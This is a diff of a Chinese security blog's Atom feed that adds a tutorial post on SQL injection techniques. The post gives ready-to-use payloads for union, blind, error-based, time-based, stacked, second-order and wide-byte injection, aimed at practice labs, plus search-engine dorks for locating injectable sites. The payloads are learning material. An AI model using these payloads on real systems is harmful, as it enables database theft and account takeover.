@@ -3,30 +3,290 @@
     <id>http://example.com</id>
     <title>ch1e&#39;s Blog • Posts by &#34;web安全&#34; tag</title>
     <link href="http://example.com" />
-    <updated>2013-12-24T15:29:53.000Z</updated>
+    <updated>2021-06-07T10:24:59.678Z</updated>
+    <category term="web开发" />
+    <category term="数据库" />
     <category term="web安全" />
     <category term="misc" />
     <category term="渗透测试" />
     <category term="内网渗透" />
     <category term="pwn" />
     <category term="reverse" />
-    <category term="web开发" />
-    <category term="数据库" />
     <category term="src挖掘" />
     <category term="密码学" />
+    <entry>
+        <id>http://example.com/2021/06/07/sql%E6%B3%A8%E5%85%A5/</id>
+        <title>SQL注入笔记</title>
+        <link rel="alternate" href="http://example.com/2021/06/07/sql%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介:&lt;/h1&gt;
+&lt;h2 id=&#34;sql注入漏洞产生的原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入漏洞产生的原因&#34;&gt;#&lt;/a&gt; SQL 注入漏洞产生的原因&lt;/h2&gt;
+&lt;p&gt;SQL Injection&lt;br&gt;
+ 程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患&lt;br&gt;
+用户可以提交一段 数据库查询代码，根据程序返回的结果，获得某些他想得知的 数据或 进行数据库操作&lt;br&gt;
+ ##SQL 语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;查询： SELECT statement FROM table WHERE condition
+删除记录： DELETE FROM table WHERE condition
+更新记录： UPDATE table SET field=value WHERE condtion
+添加记录： INSERT INTO table field VALUES(values)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;sql注入笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入笔记&#34;&gt;#&lt;/a&gt; SQL 注入笔记&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;最基础的注入 - union 注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Boolean 注入攻击 - 布尔盲注&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;时间注入攻击 - 时间盲注&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;报错注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;堆叠查询注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;二次注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;宽字节注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;base64 注入攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cookie 注入攻击 - http 请求头参数注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;XFF 注入攻击 - http 请求头参数注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;知道绝对路径的注入&lt;br&gt;
+ ##0x01 最基础的注入 - union 注入攻击&lt;br&gt;
+ 1. 首先判断是 GET 类型还是 POST 类型的注入&lt;br&gt;
+ 2. 寻找出他后端的闭合规则&lt;br&gt;
+ 3. 使用 order by 或者 group by 来判断有几个字段&lt;br&gt;
+ order by 是 mysql 中对查询数据进行排序的方法&lt;br&gt;
+ select * from 表名 order by 列名 (或者数字) asc；升序 (默认升序)&lt;br&gt;
+ select * from 表名 order by 列名 (或者数字) desc；降序&lt;br&gt;
+我们可以通过对 order by 后面输入的数字不同来判断出他有几个字段&lt;br&gt;
+&lt;strong&gt;一般食用方法：若 order by x 与 order by x+1 回显不一样，则有 x 个字段&lt;/strong&gt;&lt;br&gt;
+ 4. 使用 union select 1,2,3,4，… 有几个字段就写几个，例如五个字段就是 select 1,2,3,4,5&lt;br&gt;
+ 判断哪个位置有回显，我们就在有回显的位置进行查询&lt;br&gt;
+ 5. 例如有仨个字段，2,3 位置有回显，我们就可以把 2,3 位置上替换成 database (),user (),version () 等有利于我们收集信息的函数。&lt;br&gt;
+6. 知道了我们当前的数据库以后我们就需要查询该数据库的下的表的内容。&lt;/p&gt;
+&lt;p&gt;union select 1,group_concat(table_name) from information_schema.tables where table_schema=“database()”,3&lt;br&gt;
+ 这段 sql 语句的 作用是，从 information_schema.tables 表下面查询数据库名称为 database () 下的表的表名&lt;br&gt;
+ 7. 查询到了当前数据库以及当前数据库下的表，接下来就是要对表中的字段进行查询，这里里 user 表为例&lt;/p&gt;
+&lt;p&gt;union select 1,group_concat(column_name)from information_schema.columns where table_name=“user”,3&lt;br&gt;
+ 这句 sql 语句的意思是从 information_schema.columns 表中查询 user 表的字段名&lt;br&gt;
+ 8. 查询到字段名以后，这里以字段名 username 和 passwd 为例&lt;/p&gt;
+&lt;p&gt;union select 1,username,passwd from user;&lt;br&gt;
+ 这句 sql 语句的意思是从 user 中查询 username 和 passwd 的字段值&lt;br&gt;
+ 9. 获取账号密码以后登陆后台&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;0x02-boolean注入攻击-布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-boolean注入攻击-布尔盲注&#34;&gt;#&lt;/a&gt; 0x02 Boolean 注入攻击 - 布尔盲注&lt;/h2&gt;
+&lt;p&gt;前言:&lt;br&gt;
+ 一些情况下，由于开发者屏蔽了报错信息，导致攻击者无法通过报错信息来进行注入的判断。&lt;br&gt;
+这种情况下的注入称之为盲注，布尔盲注是基于真假的判断，不论输入的是什么，都只会返回 true 或者 false&lt;br&gt;
+ 布尔盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否&lt;br&gt;
+ ### 布尔盲注的判断方式&lt;br&gt;
+通过长度判断 length ():length (database ())&amp;gt;=x&lt;br&gt;
+ 通过字符判断 substr ():substr (database (),1,1) =‘x’&lt;br&gt;
+通过 ascII 码判断:ascii ():ascii (substr (database (),1,1)) =x&lt;/p&gt;
+&lt;h3 id=&#34;布尔盲注的注入判断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#布尔盲注的注入判断&#34;&gt;#&lt;/a&gt; 布尔盲注的注入判断&lt;/h3&gt;
+&lt;p&gt;1.id=1’ 报错&lt;br&gt;
+ 2.id=1 and 1=1 结果和 id=1 一样&lt;br&gt;
+ 3.id=1 and 1=2 结果异常&lt;br&gt;
+ ### 布尔盲注的实现&lt;br&gt;
+ 1. 首先我们应该找到 sql 语句的闭合规则，这里以普通的单引号为例&lt;br&gt;
+ 2. 布尔盲注要用到 length () 和 substr () 语句，用两种状态来猜解数据库、表名等的长度和正确字母&lt;br&gt;
+ 3. 首先需要我们来猜数据库的长度，使用的是二分法；一次一次的判断，更改数据库的长度，根据返回的&lt;br&gt;
+ true 或者 false 来得到正确的数据库长度&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; id=1&#39; and length(database())&amp;gt;=1 --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;4. 其次，得到了正确的数据库长度以后我们需要来得到他的数据库名，这里手工注入太麻烦我们也可以选择使用 burpsuite 来帮助我们进行注入，Burpsuite 的具体使用先暂不介绍；&lt;br&gt;
+substr () 函数是用来截取数据库某个字段的一部分，有三个参数，第一个是数据库中需要截取的字段&lt;br&gt;
+第二个是从第几个开始，第三个字段是截取的数目，所以下面的 sql 语句是截取 database () 字段从第一个开始，截取一个字符，然后再使用 Burpsuite 或者 Python 来跑出完整的数据库名即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; id=1&#39;and substr(database(),1,1)=&#39;a&#39; --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;5. 得到了数据库名，我们还要得到该数据库下的表；具体原理相似，只是把 union 联合查询注入中的查询语句放入到了函数中，把查询出来的数据作为我们函数的参数，这里就不再多做介绍&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),1,1)=&#39;a&#39;--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;6. 得到数据库表以后，我们要获取数据库字段名&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;id=1&#39; and substr((select column_name from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;users&#39; limit 0,1),1,1)=&#39;a&#39;--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;7. 查询出数据库字段名以后，我们需要获取具体的数据&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;id=1&#39; and substr((select username from test.users limit 0,1),1,1)=&#39;a&#39;--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;0x03-报错注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-报错注入攻击&#34;&gt;#&lt;/a&gt; 0x03 报错注入攻击&lt;/h2&gt;
+&lt;h3 id=&#34;前提&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前提&#34;&gt;#&lt;/a&gt; 前提：&lt;/h3&gt;
+&lt;p&gt;页面没有显示位，但有 SQL 语句执行错误信息输出&lt;br&gt;
+ PHP.INI 中 display_errors=ON 开启错误回显&lt;/p&gt;
+&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
+&lt;p&gt;floor();updatexml();ExtractValue();&lt;/p&gt;
+&lt;h3 id=&#34;updatexml函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#updatexml函数&#34;&gt;#&lt;/a&gt; updatexml（）函数&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;updatexml（）是一个使用不同的 xml 标记匹配和替换 xml 块的函数。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;作用：改变文档中符合条件的节点的值&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是 string 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：代表路径，Xpath 格式的字符串例如 //title【@lang】 第三个参数：string 格式，替换查找到的符合条件的数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;updatexml 使用时，当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;例如： select * from test where ide = 1 and (updatexml (1,0x7e,3)); 由于 0x7e 是～，不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;extractvalue函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#extractvalue函数&#34;&gt;#&lt;/a&gt; extractvalue（）函数&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;此函数从目标 XML 中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string) 第一个参数：string 格式，为 XML 文档对象的名称 第二个参数：xpath_string（xpath 格式的字符串） select *from test where id=1 and (extractvalue (1,concat (0x7e,(select user ()),0x7e)));&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;extractvalue 使用时当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;select user,password from users where user_id=1 and (extractvalue(1,0x7e));&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;由于 0x7e 就是～不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;br&gt;
+### 报错注入的利用方式&lt;br&gt;
+这里就不具体介绍了，只需要使用 payload，把执行语句替换就可以了&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;函数&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;利用方法&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;floor()&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;select count (*) from information _schema.tables group by concat ((此处加入执行语句),0x7e,floor (rand (0)*2));&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;extractvalue()&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;updatexml()&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;0x04-时间注入攻击-时间盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-时间注入攻击-时间盲注&#34;&gt;#&lt;/a&gt; 0x04 时间注入攻击 - 时间盲注&lt;/h2&gt;
+&lt;h3 id=&#34;时间注入介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#时间注入介绍&#34;&gt;#&lt;/a&gt; 时间注入介绍&lt;/h3&gt;
+&lt;p&gt;利用 sleep () 或 benchmark () 等函数让 mysql 执行时间变长经常与 if (expr1,expr2,expr3) 语句结合使用，通过页面的响应时间来判断条件是否正确。if (expr1,expr2,expr3) 含义是如果 expr1 是 True, 则返回 expr2, 否则返回 expr3。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;其实时间盲注和布尔盲注原理相似，只是利用 sleep () 等函数使执行时间变成来判断条件的正确，这里不再过多介绍，直接上 Payload&lt;br&gt;
+payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;爆数据库名长度
+**&#39; and if(length(database())&amp;gt;=8,sleep(5),1)#
+爆数据库：
+**&#39; and if(substr(database(),1,1)=&#39;p&#39;,sleep(5),null) #
+爆数据表：
+**&#39; and if((substr(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 1,1),1,1))=&#39;a&#39;,sleep(5),null) #
+爆数据列：
+**&#39; and if((substr(select column_name from information_schema.columns  where table_name=&#39;users&#39; limit 1,1),1,1))=&#39;a&#39;,sleep(5),null) #
+爆数据信息：
+**&#39; and if((substr((select password from users limit 0,1),1,1))=&#39;a&#39;,sleep(5),null)#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;注意：一般注入时，猜错的几率大，所以在猜对了的时候让页面 sleep ()&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x05-堆叠查询注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05-堆叠查询注入攻击&#34;&gt;#&lt;/a&gt; 0x05 堆叠查询注入攻击&lt;/h2&gt;
+&lt;h3 id=&#34;原理介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理介绍&#34;&gt;#&lt;/a&gt; 原理介绍&lt;/h3&gt;
+&lt;p&gt;SQL 中，分号是用来表示一条 sql 语句的结束，我们可以在一条语句的结束后的；后继续构造下一条语句，会一起被执行，所以这就造成了堆叠注入，堆叠注入和 union 联合查询注入都是把两条语句合并在一起，两者之间的区别在于 union 执行的语句是有限的，而堆叠注入可以执行任意的语句&lt;/p&gt;
+&lt;h3 id=&#34;堆叠注入的实现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#堆叠注入的实现&#34;&gt;#&lt;/a&gt; 堆叠注入的实现&lt;/h3&gt;
+&lt;p&gt;正常 sql 语句：Select * from users where id=’1’’;&lt;br&gt;
+ 注入 sql 语句：Select * from users where id=’1’;select if (length (database ())&amp;gt;5,sleep (5),1) #&lt;br&gt;
+我们通过上面的比较可以看出，正常 sql 语句和注入 sql 语句的不同就在于 sql 注入语句后还有一条 sql 语句，是一条时间盲注的语句，所以我们只需要在正常的查询语句后面加上我们其他注入的方法就好了 (个人理解，如果有错误欢迎各位大佬指正)，因此 payload 的构造就是在正常输入后加上一个分号，然后加上其他类型的 sql 注入语句即可&lt;/p&gt;
+&lt;h2 id=&#34;0x06-二次注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x06-二次注入攻击&#34;&gt;#&lt;/a&gt; 0x06 二次注入攻击&lt;/h2&gt;
+&lt;h3 id=&#34;二次注入原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入原理&#34;&gt;#&lt;/a&gt; 二次注入原理&lt;/h3&gt;
+&lt;p&gt;二次注入可以理解为攻击者构造的恶意数据存储在数据库以后，恶意数据被读取进入到 sql 查询语句所导致的注入。防御者可能存在用户输入恶意数据时对其中的特殊字符进行了转移，但在恶意数据插入到数据库时被处理的数据又被还原并且存储在数据库中，当 web 程序调用存储在数据库中的恶意数据并查询时，就发生了二次注入&lt;br&gt;
+ ### 二次注入条件&lt;br&gt;
+（1）用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如 mysql_escape_string、mysql_real_escape_string 转义）&lt;br&gt;
+（2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户&lt;/p&gt;
+&lt;h3 id=&#34;二次注入实现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入实现&#34;&gt;#&lt;/a&gt; 二次注入实现&lt;/h3&gt;
+&lt;p&gt;这里以 sqli-libs-24 关为例子&lt;br&gt;
+ 1. 首先，我们注册一个账号，名为：admin’#   , 密码为：123456&lt;br&gt;
+2. 注册成功，尝试登录 admin’#  ，然后可以查看一下 phpmyadmin 内存储情况&lt;br&gt;
+ 3. 这是 admin 的原密码是 admin，两个账号都在数据库内，在我们重新修改 admin’# 的密码时候，这里改为 123456789，可以发现 admin 的密码被改为了 12345678，而 admin’# 的密码并未发生改变&lt;br&gt;
+&lt;img data-src=&#34;https://www.qqblog.top/image/2sql.png&#34; alt=&#34;请输入图片描述&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://www.qqblog.top/image/2sql1.png&#34; alt=&#34;请输入图片描述&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;二次注入代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入代码审计&#34;&gt;#&lt;/a&gt; 二次注入代码审计&lt;/h3&gt;
+&lt;p&gt;注册用户时：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$sql = &amp;quot;insert into users ( username, password) values(\&amp;quot;$username\&amp;quot;, \&amp;quot;$pass\&amp;quot;)&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改密码时:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$username= $_SESSION[&amp;quot;username&amp;quot;];//取出数据库的数据
+
+$sql = &amp;quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &amp;quot;;//对该用户的密码进行更新
+
+$sql = &amp;quot;UPDATE users SET PASSWORD=&#39;12345678&#39; where username=&#39;admin&#39;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;0x07-宽字节注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x07-宽字节注入攻击&#34;&gt;#&lt;/a&gt; 0x07 宽字节注入攻击–&lt;/h2&gt;
+&lt;p&gt;本模块部分内容转自 https://blog.csdn.net/helloc0de/article/details/76180190&lt;br&gt;
+### 涉及到的基本概念&lt;br&gt;
+字符、字符集&lt;br&gt;
+字符 (character) 是组成字符集 (character set) 的基本单位。对字符赋予一个数值 (encoding) 来确定这个字符在该字符集中的位置。&lt;br&gt;
+UTF8&lt;br&gt;
+ 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用 ASCII 表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及 UTF (Universal Transformation Format)。&lt;br&gt;
+宽字节&lt;br&gt;
+ GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。&lt;br&gt;
+### 宽字节注入原理&lt;br&gt;
+ GBK 占用两字节&lt;br&gt;
+ ASCII 占用一字节&lt;br&gt;
+ PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\”），MYSQL 默认字符集是 GBK 等宽字节字符集。&lt;/p&gt;
+&lt;p&gt;大家都知道 % df’ 被 PHP 转义（开启 GPC、用 addslashes 函数，或者 icov 等），单引号被加上反斜杠 \，变成了 % df\’，其中 \ 的十六进制是 %5C ，那么现在 % df\’ =% df%5c%27，如果程序的默认字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为 % df%5c 是一个宽字符，也就是縗，也就是说：% df\’ = % df%5c%27 = 縗’，有了单引号就好注入了。&lt;br&gt;
+例子：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/Less-32/?id=1%df&#39;(&#39;浏览器自动进行url编码%27)
+根据以上分析，发生如下转换：
+%df%27====&amp;gt;(check_addslashes)====&amp;gt;%df%5c%27====&amp;gt;(GBK)====&amp;gt;運&#39;
+MySQL执行的语句为：
+$sql=&amp;quot;SELECT * FROM users WHERE id=&#39;1運&#39;&#39; LIMIT 0,1&amp;quot;;成功将单引号闭合，可以进行SQL注入。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;0x08-base64注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x08-base64注入攻击&#34;&gt;#&lt;/a&gt; 0x08 base64 注入攻击&lt;/h2&gt;
+&lt;p&gt;### 什么是 base64 注入？&lt;br&gt;
+base64 注入是针对传递的参数被 base64 加密后的注入点进行注入。除了数据被加密意外，其中注入方式与常规注入一般无二&lt;/p&gt;
+&lt;h3 id=&#34;如何发现此漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何发现此漏洞&#34;&gt;#&lt;/a&gt; 如何发现此漏洞？&lt;/h3&gt;
+&lt;p&gt;在互联网系统中，目前遇到两种 base64 加密传参方式&lt;/p&gt;
+&lt;p&gt;第一种，例如 id=1，把 id=1 全部加密处理，得到 aWQ9MQ==，直接搜索 inurl:?aWQ0&lt;/p&gt;
+&lt;p&gt;第二种，只处理传参值，得到 id=MQ==，搜索 inurl:?id=M*=&lt;br&gt;
+##0x09 HTTP 请求头参数注入 - cookie 注入攻击&lt;br&gt;
+该注入的产生原因是因为程序员没有将 COOKIE 进行合法化检测，并将其代入到了数据库中查询了且查询变量是可控的，当用户登录成功后会产生 COOKIE, 每次页面刷新后端都会拿着这个 COOKIE 带入数据库查找，这是非常危险的.&lt;br&gt;
+ 具体实例如下图，不多做介绍&lt;br&gt;
+&lt;img data-src=&#34;https://www.qqblog.top/image/cookieinjection.png&#34; alt=&#34;请输入图片描述&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x10-http请求头参数注入-xff注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x10-http请求头参数注入-xff注入攻击&#34;&gt;#&lt;/a&gt; 0x10 HTTP 请求头参数注入 - XFF 注入攻击&lt;/h2&gt;
+&lt;p&gt;实际情况下，有部份站点接受数据是以 http 数据包中的 http 头部去数据接收，所以，测试注入点的时候，需要将注入语句写入到 http 头部中。&lt;br&gt;
+具体实例如下图，不多做介绍&lt;br&gt;
+&lt;img data-src=&#34;https://www.qqblog.top/image/xffinjection.png&#34; alt=&#34;请输入图片描述&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="数据库" />
+        <category term="web安全" />
+        <updated>2021-06-07T10:24:59.678Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2013/12/24/tags/</id>
         <title>Tags</title>
         <link rel="alternate" href="http://example.com/2013/12/24/tags/"/>
         <content type="html"></content>
+        <category term="web开发" />
+        <category term="数据库" />
         <category term="web安全" />
         <category term="misc" />
         <category term="渗透测试" />
         <category term="内网渗透" />
         <category term="pwn" />
         <category term="reverse" />
-        <category term="web开发" />
-        <category term="数据库" />
         <category term="src挖掘" />
         <category term="密码学" />
         <updated>2013-12-24T15:29:53.000Z</updated>
